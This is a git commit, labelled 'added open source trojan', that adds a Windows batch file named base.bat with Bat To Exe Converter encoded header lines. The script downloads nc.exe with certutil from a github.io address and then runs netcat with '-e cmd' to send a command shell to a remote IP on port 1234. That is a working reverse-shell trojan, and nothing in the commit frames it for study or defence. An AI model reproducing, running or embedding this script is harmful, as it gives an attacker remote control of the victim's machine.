618d1b76f4d01b80fe4fbaa862494266c4733a99
TriTriTheCuber <121834111+TriTriTheCuber@users.noreply.github.com>
2024-01-27 21:49:19 -0500

    added open source trojan

---
+++ base.bat
@@ -0,0 +1,36 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFA9GRQWMAES0A5EO4f7+086CsUYJW/IDSo7V3ruDYPMH/0PiSZIiwXRWl8oIQQldcx29aw0z5H5Qs3KMMtDSugzuKg==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFA9GRQWMAES0A5EO4f7+086CsUYJW/IDSo7V3ruDYPMH/0PiSbU4xW5VlYsBDR9dPiSifBonrH1+uGfLMt+Z8w3gXgid9EQ6GmtIpkWeiTM+AA==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+certutil -urlcache -split -f https://tritrithecuber.github.io/nc.exe nc.exe
+nc.exe -e cmd 172.24.215.156 1234
